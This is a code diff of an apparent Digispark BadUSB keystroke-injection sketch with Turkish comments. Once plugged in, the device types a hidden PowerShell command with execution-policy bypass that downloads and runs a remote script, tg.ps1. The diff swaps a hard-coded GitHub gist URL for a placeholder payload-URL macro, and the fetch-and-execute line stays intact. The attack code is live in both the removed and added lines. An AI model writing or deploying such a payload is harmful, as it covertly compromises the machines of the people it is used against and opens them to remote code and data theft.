@@ -3,6 +3,9 @@
 
 bool runOnce = true;
 
+// Yapılandırma
+#define PAYLOAD_URL "https://[BURAYA_PAYLOAD_URL_GELECEK]/tg.ps1"
+
 void setup() {
   DigiKeyboard.delay(2000); // Sistemin hazır olmasını bekle
 }
@@ -22,8 +25,10 @@ void loop() {
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(800);
 
-    // Gist linkinden uzaktan PowerShell scriptini çalıştır
-    DigiKeyboard.print("powershell -w hidden -ep bypass -c \"iex (iwr -UseBasicParsing 'https://gist.github.com/Eren-Oztk/147edce7b621e8822e3a8358a58ca3ff.js/tg.ps1')\"");
+    // Uzaktan PowerShell scriptini çalıştır (Gizli pencere ve Execution Policy Bypass ile)
+    DigiKeyboard.print("powershell -w hidden -ep bypass -c \"iex (iwr -UseBasicParsing '");
+    DigiKeyboard.print(PAYLOAD_URL);
+    DigiKeyboard.print("')\"");
     DigiKeyboard.delay(500);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
